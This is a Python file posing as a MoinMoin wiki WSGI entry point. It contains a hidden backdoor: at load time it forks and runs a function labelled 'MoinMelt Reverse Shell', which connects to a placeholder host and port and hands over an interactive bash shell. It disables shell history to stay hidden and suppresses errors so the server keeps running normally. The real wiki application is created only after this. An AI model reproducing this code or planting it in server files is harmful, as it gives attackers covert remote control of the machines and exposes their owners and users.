# -*- coding: iso-8859-1 -*-

import sys, os, socket, pty, select
pwd = os.path.dirname(__file__)
sys.path.insert(0, pwd)

def moinmeltshell(host,port):
    sock = socket.socket()
    try:
        sock.connect((host, int(port)))
    except:
        return
    pid, childProcess = pty.fork()
    if pid == 0:
        sock.send("[~] \x1b[1;31mMoinMelt Reverse Shell\x1b[0m\r\n")
        os.putenv("HISTFILE","/dev/null")
        os.putenv("PWD", pwd)
        os.putenv("HOME", os.getcwd())
        os.putenv("PATH",'/usr/local/sbin:/usr/sbin:/sbin:'+os.getenv('PATH'))
        os.putenv("TERM",'linux')
        os.putenv("PS1",'\x1b[1;31m\\u@\\h:\\w\\$ \x1b[0m')
        pty.spawn("/bin/bash")
        sock.send("\r\n")
        sock.shutdown(1)
    else:
        b = sock.makefile(os.O_RDONLY|os.O_NONBLOCK)
        c = os.fdopen(childProcess,'r+')
        y = {b:c,c:b}
        try:
            while True:
                for n in select.select([b,c],[],[])[0]:
                    z = os.read(n.fileno(),4096)
                    y[n].write(z)
                    y[n].flush()
        except:
            pass

try:
    pid = os.fork()
    if not pid: moinmeltshell('[IP]', '[PORT]')
except:
    pass # Avoid internal server errors

from MoinMoin.web.serving import make_application
application = make_application(shared=True)